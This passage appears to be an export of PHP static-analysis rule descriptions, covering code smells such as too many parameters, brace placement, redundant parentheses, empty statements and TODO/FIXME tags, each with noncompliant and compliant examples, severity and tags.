<p>With a maximum number of 4 parameters:</p>
<pre>
function doSomething($param1, $param2, $param3, $param4, $param5) {
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething($param1, $param2, $param3, $param4) {
...
}
</pre>",php:S107,php,PHP,"<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 4 parameters:</p>
<pre>
function doSomething($param1, $param2, $param3, $param4, $param5) {
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething($param1, $param2, $param3, $param4) {
...
}
</pre>",Functions should not have too many parameters,"[{'key': 'max', 'defaultValue': '7', 'type': 'INTEGER'}, {'key': 'constructorMax', 'defaultValue': '7', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2017-11-30T14:19:40+0100,"<p>Hard coding a URI makes it difficult to test a program: path literals are not always portable across operating systems, a given absolute path may
not exist on a specific test environment, a specified Internet URL may not be available when executing the tests, production environment filesystems
usually differ from the development environment, ...etc. For all those reasons, a URI should never be hard coded. Instead, it should be replaced by
customizable parameter.</p>
<p>Further even if the elements of a URI are obtained dynamically, portability can still be limited if the path-delimiters are hard-coded.</p>
<p>This rule raises an issue when URI's or path delimiters are hard coded.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>",php:S1075,php,PHP,"<p>Hard coding a URI makes it difficult to test a program: path literals are not always portable across operating systems, a given absolute path may
not exist on a specific test environment, a specified Internet URL may not be available when executing the tests, production environment filesystems
usually differ from the development environment, ...etc. For all those reasons, a URI should never be hard coded. Instead, it should be replaced by
customizable parameter.</p>
<p>Further even if the elements of a URI are obtained dynamically, portability can still be limited if the path-delimiters are hard-coded.</p>
<p>This rule raises an issue when URI's or path delimiters are hard coded.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>",URIs should not be hardcoded,[],MINOR,['cert'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for ($i = 0; $i &lt; 42; $i++){}  // Empty on purpose or missing piece of code ?
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty.</p>",php:S108,php,PHP,"<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for ($i = 0; $i &lt; 42; $i++){}  // Empty on purpose or missing piece of code ?
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty.</p>",Nested blocks of code should not be left empty,[],MAJOR,['suspicious'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when an open curly brace is not placed at the end of a
line of code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(condition)
{
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if(condition) {
  doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>When blocks are inlined (left and right curly braces on the same line), no issue is triggered. </p>
<pre>
if(condition) {doSomething();}
</pre>",php:S1105,php,PHP,"<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when an open curly brace is not placed at the end of a
line of code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(condition)
{
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if(condition) {
  doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>When blocks are inlined (left and right curly braces on the same line), no issue is triggered. </p>
<pre>
if(condition) {doSomething();}
</pre>",An open curly brace should be located at the end of a line,[],MINOR,['convention'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>Shared coding conventions make it possible to collaborate efficiently. This rule makes it mandatory to place the open curly brace at the beginning
of a line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function myMethod() {  // Noncompliant
  if(something) {  // Noncompliant
    executeTask();
  } else {  //Noncompliant
    doSomethingElse();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function myMethod()
{
  if(something)
  {
    executeTask();
  } else
  {
    doSomethingElse();
  }
}
</pre>",php:S1106,php,PHP,"<p>Shared coding conventions make it possible to collaborate efficiently. This rule makes it mandatory to place the open curly brace at the beginning
of a line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function myMethod() {  // Noncompliant
  if(something) {  // Noncompliant
    executeTask();
  } else {  //Noncompliant
    doSomethingElse();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function myMethod()
{
  if(something)
  {
    executeTask();
  } else
  {
    doSomethingElse();
  }
}
</pre>",An open curly brace should be located at the beginning of a line,[],MINOR,['convention'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>Shared coding conventions make it possible for a team to efficiently collaborate. This rule makes it mandatory to place a close curly brace at the
beginning of a line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(condition) {
  doSomething();}
</pre>
<h2>Compliant Solution</h2>
<pre>
if(condition) {
  doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>When blocks are inlined (open and close curly braces on the same line), no issue is triggered. </p>
<pre>
if(condition) {doSomething();}
</pre>",php:S1109,php,PHP,"<p>Shared coding conventions make it possible for a team to efficiently collaborate. This rule makes it mandatory to place a close curly brace at the
beginning of a line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(condition) {
  doSomething();}
</pre>
<h2>Compliant Solution</h2>
<pre>
if(condition) {
  doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>When blocks are inlined (open and close curly braces on the same line), no issue is triggered. </p>
<pre>
if(condition) {doSomething();}
</pre>",A close curly brace should be located at the beginning of a line,[],MINOR,['convention'],CODE_SMELL
2017-11-30T14:19:40+0100,"<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
$x = ($y / 2 + 1); // Compliant even if the parenthesis are ignored by the compiler

if ($a &amp;&amp; (($x + $y &gt; 0))) { // Noncompliant
  //...
}

return (($x + 1)); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
$x = ($y / 2 + 1);

if ($a &amp;&amp; ($x + $y &gt; 0)) {
  //...
}

return ($x + 1);
</pre>",php:S1110,php,PHP,"<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
$x = ($y / 2 + 1); // Compliant even if the parenthesis are ignored by the compiler

if ($a &amp;&amp; (($x + $y &gt; 0))) { // Noncompliant
  //...
}

return (($x + 1)); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
$x = ($y / 2 + 1);

if ($a &amp;&amp; ($x + $y &gt; 0)) {
  //...
}

return ($x + 1);
</pre>",Redundant pairs of parentheses should be removed,[],MAJOR,['confusing'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>Empty statements, i.e. <code>;</code>, are usually introduced by mistake, for example because:</p>
<ul>
  <li> It was meant to be replaced by an actual statement, but this was forgotten. </li>
  <li> There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
function doSomething() {
  ;                                              // Noncompliant - was used as a kind of TODO marker
}

function doSomethingElse($p) {
  echo $p;;                                      // Noncompliant - double ;
}

for ($i = 1; $i &lt;= 10; doSomething($i), $i++);   // Noncompliant - Rarely, they are used on purpose as the body of a loop. It is a bad practice to have side-effects outside of the loop body
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething() {}

function doSomethingElse($p) {
  echo $p;

  for ($i = 1; $i &lt;= 10; $i++) {
    doSomething($i);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment provided that
  the first character following the null statement is a white-space character. </li>
  <li> MISRA C++:2008, 6-2-3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment, provided
  that the first character following the null statement is a white-space character. </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/7gCTAw"">CERT, MSC51-J.</a> - Do not place a semicolon immediately following an if, for,
  or while condition </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/i4FtAg"">CERT, EXP15-C.</a> - Do not place a semicolon on the same line as an if, for,
  or while statement </li>
</ul>",php:S1116,php,PHP,"<p>Empty statements, i.e. <code>;</code>, are usually introduced by mistake, for example because:</p>
<ul>
  <li> It was meant to be replaced by an actual statement, but this was forgotten. </li>
  <li> There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
function doSomething() {
  ;                                              // Noncompliant - was used as a kind of TODO marker
}

function doSomethingElse($p) {
  echo $p;;                                      // Noncompliant - double ;
}

for ($i = 1; $i &lt;= 10; doSomething($i), $i++);   // Noncompliant - Rarely, they are used on purpose as the body of a loop. It is a bad practice to have side-effects outside of the loop body
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething() {}

function doSomethingElse($p) {
  echo $p;

  for ($i = 1; $i &lt;= 10; $i++) {
    doSomething($i);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment provided that
  the first character following the null statement is a white-space character. </li>
  <li> MISRA C++:2008, 6-2-3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment, provided
  that the first character following the null statement is a white-space character. </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/7gCTAw"">CERT, MSC51-J.</a> - Do not place a semicolon immediately following an if, for,
  or while condition </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/i4FtAg"">CERT, EXP15-C.</a> - Do not place a semicolon on the same line as an if, for,
  or while statement </li>
</ul>",Empty statements should be removed,[],MINOR,"['cert', 'misra', 'unused']",CODE_SMELL
2014-06-12T08:21:17+0200,"<p>Shadowing fields with a local variable is a bad practice that reduces code readability: it makes it confusing to know whether the field or the
variable is being used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Foo {
  public $myField;

  public function doSomething() {
    $myField = 0;
    ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/2ADEAw"">CERT, DCL51-J.</a> - Do not shadow or obscure identifiers in subscopes </li>
</ul>",php:S1117,php,PHP,"<p>Shadowing fields with a local variable is a bad practice that reduces code readability: it makes it confusing to know whether the field or the
variable is being used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Foo {
  public $myField;

  public function doSomething() {
    $myField = 0;
    ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/2ADEAw"">CERT, DCL51-J.</a> - Do not shadow or obscure identifiers in subscopes </li>
</ul>",Local variables should not have the same name as class fields,[],MAJOR,"['cert', 'pitfall']",CODE_SMELL
2015-04-16T15:44:58+0200,"<p>If you throw a general exception type, such as ErrorException, RuntimeException, or Exception in a library or framework, it forces consumers to
catch all exceptions, including unknown exceptions that they do not know how to handle.</p>
<p>Instead, either throw a subtype that already exists in the Standard PHP Library, or create your own type that derives from Exception.</p>
<h2>Noncompliant Code Example</h2>
<pre>
throw new Exception();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
throw new InvalidArgumentException();
// or
throw new UnexpectedValueException();
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/397.html"">MITRE, CWE-397</a> - Declaration of Throws for Generic Exception </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BoB3AQ"">CERT, ERR07-J.</a> - Do not throw RuntimeException, Exception, or Throwable
  </li>
</ul>",php:S112,php,PHP,"<p>If you throw a general exception type, such as ErrorException, RuntimeException, or Exception in a library or framework, it forces consumers to
catch all exceptions, including unknown exceptions that they do not know how to handle.</p>
<p>Instead, either throw a subtype that already exists in the Standard PHP Library, or create your own type that derives from Exception.</p>
<h2>Noncompliant Code Example</h2>
<pre>
throw new Exception();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
throw new InvalidArgumentException();
// or
throw new UnexpectedValueException();
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/397.html"">MITRE, CWE-397</a> - Declaration of Throws for Generic Exception </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BoB3AQ"">CERT, ERR07-J.</a> - Do not throw RuntimeException, Exception, or Throwable
  </li>
</ul>","Generic exceptions ErrorException, RuntimeException and Exception should not be thrown",[],MAJOR,"['cert', 'cwe', 'error-handling']",CODE_SMELL
2017-11-30T14:19:40+0100,"<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable. Ideally, sub-expressions should not have
side-effects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ($val = value() &amp;&amp; check()) { // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
$val = value();
if ($val &amp;&amp; check()) {
}
</pre>
<p>or </p>
<pre>
if ($val == value() &amp;&amp; check()) { // Perhaps in fact the assignment operator was expected
}
</pre>
<h2>Exceptions</h2>
<p>Assignments in <code>while</code> statement conditions, and assignments enclosed in relational expressions are allowed.</p>
<pre>
while (($line = next_line()) != NULL) {...}

while ($line = next_line()) {...}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.1 - Assignment operators shall not be used in expressions that yield a Boolean value </li>
  <li> MISRA C++:2008, 6-2-1 - Assignment operators shall not be used in sub-expressions </li>
  <li> MISRA C:2012, 13.4 - The result of an assignment operator should not be used </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/481.html"">MITRE, CWE-481</a> - Assigning instead of Comparing </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/nYFtAg"">CERT, EXP45-C.</a> - Do not perform assignments in selection statements </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/1gCTAw"">CERT, EXP51-J.</a> - Do not perform assignments in conditional expressions
  </li>
</ul>",php:S1121,php,PHP,"<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable. Ideally, sub-expressions should not have
side-effects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ($val = value() &amp;&amp; check()) { // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
$val = value();
if ($val &amp;&amp; check()) {
}
</pre>
<p>or </p>
<pre>
if ($val == value() &amp;&amp; check()) { // Perhaps in fact the assignment operator was expected
}
</pre>
<h2>Exceptions</h2>
<p>Assignments in <code>while</code> statement conditions, and assignments enclosed in relational expressions are allowed.</p>
<pre>
while (($line = next_line()) != NULL) {...}

while ($line = next_line()) {...}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.1 - Assignment operators shall not be used in expressions that yield a Boolean value </li>
  <li> MISRA C++:2008, 6-2-1 - Assignment operators shall not be used in sub-expressions </li>
  <li> MISRA C:2012, 13.4 - The result of an assignment operator should not be used </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/481.html"">MITRE, CWE-481</a> - Assigning instead of Comparing </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/nYFtAg"">CERT, EXP45-C.</a> - Do not perform assignments in selection statements </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/1gCTAw"">CERT, EXP51-J.</a> - Do not perform assignments in conditional expressions
  </li>
</ul>",Assignments should not be made from within sub-expressions,[],MAJOR,"['cert', 'cwe', 'misra', 'suspicious']",CODE_SMELL
2014-07-08T19:45:46+0200,"<p>The PSR2 standard recommends listing modifiers in the following order to improve the readability of PHP source code:</p>
<ol>
  <li> final or abstract </li>
  <li> public or protected or private </li>
  <li> static </li>
</ol>
<h2>Noncompliant Code Example</h2>
<pre>
static protected $foo;
...
public static final function bar(){...}
</pre>
<h2>Compliant Solution</h2>
<pre>
protected static $foo;
...
final public static function bar(){...}
</pre>",php:S1124,php,PHP,"<p>The PSR2 standard recommends listing modifiers in the following order to improve the readability of PHP source code:</p>
<ol>
  <li> final or abstract </li>
  <li> public or protected or private </li>
  <li> static </li>
</ol>
<h2>Noncompliant Code Example</h2>
<pre>
static protected $foo;
...
public static final function bar(){...}
</pre>
<h2>Compliant Solution</h2>
<pre>
protected static $foo;
...
final public static function bar(){...}
</pre>",Modifiers should be declared in the correct order,[],MINOR,"['convention', 'psr2']",CODE_SMELL
2014-06-12T08:21:17+0200,"<p>Redundant Boolean literals should be removed from expressions to improve readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ($booleanVariable == true) { /* ... */ }
if ($booleanVariable != true) { /* ... */ }
if ($booleanVariable || false) { /* ... */ }
doSomething(!false);

$booleanVariable = condition ? true : exp;
$booleanVariable = condition ? false : exp;
$booleanVariable = condition ?  exp : true;
$booleanVariable = condition ?  exp : false;
</pre>
<h2>Compliant Solution</h2>
<pre>
if ($booleanVariable) { /* ... */ }
if (!$booleanVariable) { /* ... */ }
if ($booleanVariable) { /* ... */ }
doSomething(true);

$booleanVariable = condition || exp;
$booleanVariable = !condition &amp;&amp; exp;
$booleanVariable = !condition ||  exp;
$booleanVariable = condition &amp;&amp; exp;
</pre>
<h2>Exceptions</h2>
<p>The use of literal booleans in comparisons which use identity operators (<code>===</code> and <code>!==</code>) are ignored.</p>",php:S1125,php,PHP,"<p>Redundant Boolean literals should be removed from expressions to improve readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ($booleanVariable == true) { /* ... */ }
if ($booleanVariable != true) { /* ... */ }
if ($booleanVariable || false) { /* ... */ }
doSomething(!false);

$booleanVariable = condition ? true : exp;
$booleanVariable = condition ? false : exp;
$booleanVariable = condition ?  exp : true;
$booleanVariable = condition ?  exp : false;
</pre>
<h2>Compliant Solution</h2>
<pre>
if ($booleanVariable) { /* ... */ }
if (!$booleanVariable) { /* ... */ }
if ($booleanVariable) { /* ... */ }
doSomething(true);

$booleanVariable = condition || exp;
$booleanVariable = !condition &amp;&amp; exp;
$booleanVariable = !condition ||  exp;
$booleanVariable = condition &amp;&amp; exp;
</pre>
<h2>Exceptions</h2>
<p>The use of literal booleans in comparisons which use identity operators (<code>===</code> and <code>!==</code>) are ignored.</p>",Boolean literals should not be redundant,[],MINOR,['clumsy'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>Return of boolean literal statements wrapped into <code>if-then-else</code> ones should be simplified.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (expression) {
  return true;
} else {
  return false;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
return expression;
</pre>",php:S1126,php,PHP,"<p>Return of boolean literal statements wrapped into <code>if-then-else</code> ones should be simplified.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (expression) {
  return true;
} else {
  return false;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
return expression;
</pre>","Return of boolean expressions should not be wrapped into an ""if-then-else"" statement",[],MINOR,['clumsy'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>Some tools work better when files end with an empty line.</p>
<p>This rule simply generates an issue if it is missing.</p>
<p>For example, a Git diff looks like this if the empty line is missing at the end of the file:</p>
<pre>
+class Test {
+}
\ No newline at end of file
</pre>",php:S113,php,PHP,"<p>Some tools work better when files end with an empty line.</p>
<p>This rule simply generates an issue if it is missing.</p>
<p>For example, a Git diff looks like this if the empty line is missing at the end of the file:</p>
<pre>
+class Test {
+}
\ No newline at end of file
</pre>",Files should contain an empty newline at the end,[],MINOR,['convention'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>Trailing whitespaces are simply useless and should not stay in code. They may generate noise when comparing different versions of the same
file.</p>
<p>If you encounter issues from this rule, this probably means that you are not using an automated code formatter - which you should if you have the
opportunity to do so. </p>
<h2>Exceptions</h2>
<p>Lines containing only whitespaces.</p>",php:S1131,php,PHP,"<p>Trailing whitespaces are simply useless and should not stay in code. They may generate noise when comparing different versions of the same
file.</p>
<p>If you encounter issues from this rule, this probably means that you are not using an automated code formatter - which you should if you have the
opportunity to do so. </p>
<h2>Exceptions</h2>
<p>Lines containing only whitespaces.</p>",Lines should not end with trailing whitespaces,[],MINOR,"['convention', 'psr2']",CODE_SMELL
2014-06-12T08:21:17+0200,"<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function divide($numerator, $denominator) {
  return $numerator / $denominator;              // FIXME denominator value might be  0
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>",php:S1134,php,PHP,"<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function divide($numerator, $denominator) {
  return $numerator / $denominator;              // FIXME denominator value might be  0
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>","Track uses of ""FIXME"" tags",[],MAJOR,['cwe'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function doSomething() {
  // TODO
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>",php:S1135,php,PHP,"<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function doSomething() {
  // TODO
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>","Track uses of ""TODO"" tags",[],INFO,['cwe'],CODE_SMELL
2015-06-21T07:12:44+0200,"<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all
interface names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
interface myInterface {...} // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
interface MyInterface {...}
</pre>",php:S114,php,PHP,"<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all
interface names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
interface myInterface {...} // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
interface MyInterface {...}
</pre>",Interface names should comply with a naming convention,"[{'key': 'format', 'htmlDesc': 'Regular expression used to check the interface names against.', 'defaultValue': '^[A-Z][a-zA-Z0-9]*$', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p>Having too many return statements in a function increases the function's essential complexity because the flow of execution is broken each time a
return statement is encountered. This makes it harder to read and understand the logic of the function.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
function myFunction(){ // Noncompliant as there are 4 return statements
  if (condition1) {
    return true;
  } else {
    if (condition2) {
      return false;
    } else {
      return true;
    }
  }
  return false;
}
</pre>",php:S1142,php,PHP,"<p>Having too many return statements in a function increases the function's essential complexity because the flow of execution is broken each time a
return statement is encountered. This makes it harder to read and understand the logic of the function.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
function myFunction(){ // Noncompliant as there are 4 return statements
  if (condition1) {
    return true;
  } else {
    if (condition2) {
      return false;
    } else {
      return true;
    }
  }
  return false;
}
</pre>",Functions should not contain too many return statements,"[{'key': 'max', 'defaultValue': '3', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2014-11-21T07:03:47+0100,"<p><code>private</code> methods that are never executed are dead code: unnecessary, inoperative code that should be removed. Cleaning out dead code
decreases the size of the maintained codebase, making it easier to understand the program and preventing bugs from being introduced.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
  private function Foo() {}   // Compliant, private empty constructor intentionally used to prevent any direct instantiation of a class.

  public static function doSomething()
  {
    $foo = new Foo();
    ...
  }

  private function unusedPrivateFunction() {  // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo
{
  private function Foo(){}   // Compliant, private empty constructor intentionally used to prevent any direct instantiation of a class.

  public static function doSomething()
  {
    $foo = new Foo();
  }
}
</pre>",php:S1144,php,PHP,"<p><code>private</code> methods that are never executed are dead code: unnecessary, inoperative code that should be removed. Cleaning out dead code
decreases the size of the maintained codebase, making it easier to understand the program and preventing bugs from being introduced.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
  private function Foo() {}   // Compliant, private empty constructor intentionally used to prevent any direct instantiation of a class.

  public static function doSomething()
  {
    $foo = new Foo();
    ...
  }

  private function unusedPrivateFunction() {  // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo
{
  private function Foo(){}   // Compliant, private empty constructor intentionally used to prevent any direct instantiation of a class.

  public static function doSomething()
  {
    $foo = new Foo();
  }
}
</pre>","Unused ""private"" methods should be removed",[],MAJOR,['unused'],CODE_SMELL
2014-06-12T08:21:17+0200,"<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (true) {  // Noncompliant
  doSomething();
}
...
if (false) {  // Noncompliant
  doSomethingElse();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
doSomething();
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570.html"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571.html"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
</ul>",php:S1145,php,PHP,"<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (true) {  // Noncompliant
  doSomething();
}
...
if (false) {  // Noncompliant
  doSomethingElse();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
doSomething();
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570.html"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571.html"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
</ul>","Useless ""if(true) {...}"" and ""if(false){...}"" blocks should be removed",[],MAJOR,"['cwe', 'misra']",BUG
2014-06-12T08:21:17+0200,"<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all constant names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$</code>:</p>
<pre>
define(""const1"", true);

class Foo {
    const const2 = ""bar"";
}
</pre>
<h2>Compliant Solution</h2>
<pre>
define(""CONST1"", true);

class Foo {
    const CONST2 = ""bar"";
}
</pre>",php:S115,php,PHP,"<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all constant names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$</code>:</p>
<pre>
